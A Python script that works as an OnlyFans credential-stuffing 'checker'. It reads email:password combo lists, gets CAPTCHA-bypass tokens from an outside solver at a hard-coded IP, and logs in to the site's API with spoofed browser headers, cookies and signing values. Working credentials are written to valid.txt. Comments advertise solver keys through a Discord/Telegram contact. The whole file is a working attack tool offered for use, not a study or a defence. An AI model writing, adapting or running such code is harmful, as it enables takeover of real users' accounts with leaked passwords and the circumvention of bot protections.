from curl_cffi import requests
from typing import Dict, Tuple, List
import time
import base64
import requests as std_requests
import os

class Onlyfans:
    """OnlyFans login checker class"""

    BASE_URL = "https://onlyfans.com/"
    API_URL = "https://onlyfans.com/api2/v2"

    def __init__(self, solver_host: str = "localhost", solver_port: int = 5000, solver_api_key: str = ""):
        self.session = requests.Session(impersonate="chrome")
        self.authenticated = False
        self.auth_token = None
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

        # Turnstile config
        self.TURNSTILE_SITE_KEY = "0x4AAAAAAAxTqMnJc6h5lGQ5"
        self.TURNSTILE_URL = Onlyfans.BASE_URL
        self.TURNSTILE_ACTION = "login"

        # Solver config
        self.SOLVER_HOST = solver_host
        self.SOLVER_PORT = solver_port
        self.SOLVER_API_KEY = solver_api_key

        if solver_api_key == "":
            print("="*50)
            print("Add your APIKEY (DM catcha80 on Discord or TELEGRAM for free one)")
            print("="*50)
            os._exit(0)

    def get_solver_headers(self) -> Dict[str, str]:
        return {
            "Content-Type": "application/json",
            "X-API-Key": self.SOLVER_API_KEY
        }

    def get_token(self):

        payload = {
            "type": "turnstile",
            "site_key": self.TURNSTILE_SITE_KEY,
            "url": self.TURNSTILE_URL,
            "user_agent": self.user_agent

        }

        # Add action if specified
        if self.TURNSTILE_ACTION:
            payload["action"] = self.TURNSTILE_ACTION

        try:
            response = std_requests.post(
                f"http://{self.SOLVER_HOST}:{self.SOLVER_PORT}/solve",
                json=payload,
                headers=self.get_solver_headers(),
                timeout=180
            )

            data = response.json()

            if data.get("success") and data.get("token"):
                token = data.get("token")
                return token
            else:
                return None

        except:
            return None

    def login(self, email: str, password: str, turnstile_response: str = "") -> Tuple[bool, str]:
        try:
            login_url = f"{self.API_URL}/users/login"

            encoded_password = base64.b64encode(password.encode()).decode()

            cookies = {
                'fp': 'dba78ca5b5d700f216bb890df153032750199830', # bcTokenSha from local storage
                'lang': 'fr',
                'csrf': '2s5c2WcAe955509198d20ea6f66a22934d426a9c', # reverse it lmao
                'sess': 'qus5g6medncf498jqqhka6766l', # reverse it lmao
                '_cfuvid': 'C76E8KVvl2o9ew3Pk9rJOE7kr3ZA6rQcHrMy__k8Mkc-1768860224873-0.0.1.1-604800000', # from onlyfans.com request btw
                '__cf_bm': 'YwAIKYi2aCLEFEqdGlObdgS.wVO3oNw11F97bp9OOB0-1768864152-1.0.1.1-9SdkFbcktPjhNG43DsR04rsqvKjQQl7kydpgLMvB33Vx48HWRZAW7BfqU7ptmkl8Zp2tc.MLXfyhbDhVgZOpJgUejO8XVSFup4HRzl8dDpk', # from onlyfans.com request btw
            }

            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'fr-FR,fr;q=0.9',
                'app-token': '33d57ade8c02dbc5a333db99ff9ae26a', # Static
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                'origin': 'https://onlyfans.com',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://onlyfans.com/',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Brave";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'sign': '53603:2c277e3338b902bdf8a23375adbe6786b50b5d3c:aab:696e086d', # REVERSE IT LMAO
                'time': '1768864184862', # Timestamp
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
                'x-bc': 'dba78ca5b5d700f216bb890df153032750199830', # bcTokenSha from local storage
                'x-hash': 'gglzw34YOqMF4gXnh4HM0Ap0p/0mMx/MhGiNcZU=', # Text of https://cdn2.onlyfans.com/hash/
                'x-of-rev': '202601191032-71fb1be36d', # Can be fount in the page url (eX: https://static2.onlyfans.com/static/prod/f/202601191032-71fb1be36d/78714.js)
            }


            json_data = {
                'email': email,
                'turnstile-invisible-response': turnstile_response,
                'encodedPassword': encoded_password,
            }

            response = self.session.post(login_url, json=json_data, headers=headers, cookies=cookies, impersonate="chrome")

            if response.status_code == 200:
                data = response.json()
                if 'token' in data or 'auth' in data:
                    self.authenticated = True
                    self.auth_token = data.get('token') or data.get('auth', {}).get('token')
                    return True, "Login successful"
                else:
                    return False, "Invalid credentials"
            elif response.status_code == 401:
                return False, "Invalid email or password"
            elif response.status_code == 429:
                return False, "Too many attempts, rate limited"
            else:
                return False, f"Login failed with status code: {response.status_code}"

        except requests.exceptions.RequestException as e:
            return False, f"Network error: {str(e)}"
        except Exception as e:
            return False, f"Error: {str(e)}"

    def check_credentials(self, email: str, password: str) -> Dict[str, any]:
        token = self.get_token()
        success, message = self.login(email, password, token if token else "")

        return {
            "email": email,
            "valid": success,
            "message": message,
            "authenticated": self.authenticated
        }

    def logout(self) -> bool:
        self.authenticated = False
        self.auth_token = None
        self.session.cookies.clear()
        return True

    def load_combos(self, file_path: str = "combo.txt") -> List[Tuple[str, str]]:
        combos = []
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue

                    if ':' in line:
                        parts = line.split(':', 1)
                        email = parts[0].strip()
                        password = parts[1].strip()
                        combos.append((email, password))
                    else:
                        pass

            print(f"[INFO] Loaded {len(combos)} combos from {file_path}")
            return combos

        except FileNotFoundError:
            print(f"[ERROR] File not found: {file_path}")
            return []
        except Exception as e:
            print(f"[ERROR] Failed to load combos: {str(e)}")
            return []

    def check_all_combos(self, file_path: str = "combo.txt", delay: float = 1.0) -> Dict[str, List[Dict]]:
        combos = self.load_combos(file_path)
        results = {
            "valid": [],
            "invalid": []
        }

        if not combos:
            return results

        print(f"\n[INFO] Starting to check {len(combos)} combos...\n")

        for i, (email, password) in enumerate(combos, 1):
            print(f"[{i}/{len(combos)}] Checking: {email}")

            result = self.check_credentials(email, password)

            if result['valid']:
                print(f"  [✓] VALID - {result['message']}")
                results['valid'].append(result)
                self.save_valid(email, password)
            else:
                print(f"  [✗] INVALID - {result['message']}")
                results['invalid'].append(result)

            # Reset session for next check
            self.logout()

            # Delay to avoid rate limiting
            if i < len(combos):
                time.sleep(delay)

        print(f"\n[SUMMARY] Checked: {len(combos)} | Valid: {len(results['valid'])} | Invalid: {len(results['invalid'])}")

        return results

    def save_valid(self, email: str, password: str, file_path: str = "valid.txt"):
        try:
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}\n")
        except Exception as e:
            pass


if __name__ == "__main__":
    # Initialize with solver configuration
    checker = Onlyfans(
        solver_host="173.249.41.237",
        solver_port=5000,
        solver_api_key=""
    )

    # Check all combos from combo.txt
    results = checker.check_all_combos(file_path="combo.txt", delay=1.0)

    # Display results
    if results['valid']:
        print("\n" + "="*50)
        print("VALID ACCOUNTS:")
        print("="*50)
        for account in results['valid']:
            print(f"  {account['email']}")
        print(f"\nValid accounts saved to: valid.txt")
